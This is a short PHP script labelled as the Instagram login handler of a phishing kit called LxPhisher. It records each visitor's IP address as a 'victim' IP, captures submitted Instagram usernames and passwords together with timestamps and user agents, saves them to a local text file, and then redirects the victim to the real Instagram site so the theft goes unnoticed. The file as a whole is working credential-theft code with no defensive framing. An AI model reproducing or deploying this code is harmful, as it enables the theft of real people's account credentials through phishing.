<?php
/* LxPhisher Instagram Login Handler */
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
header('X-Content-Type-Options: nosniff');

function getClientIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$victim_ip = getClientIP();
file_put_contents('ip.txt', $victim_ip . PHP_EOL, FILE_APPEND);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    $log_entry = "[" . date("Y-m-d H:i:s") . "]\n";
    $log_entry .= "IP: " . $victim_ip . "\n";
    $log_entry .= "Username: " . $username . "\n";
    $log_entry .= "Password: " . $password . "\n";
    $log_entry .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $log_entry .= "----------------------------------------\n";
    
    file_put_contents('usernames.txt', $log_entry, FILE_APPEND);
    header("Location: https://www.instagram.com");
    exit();
} else {
    header("Location: index.html");
    exit();
}
?>
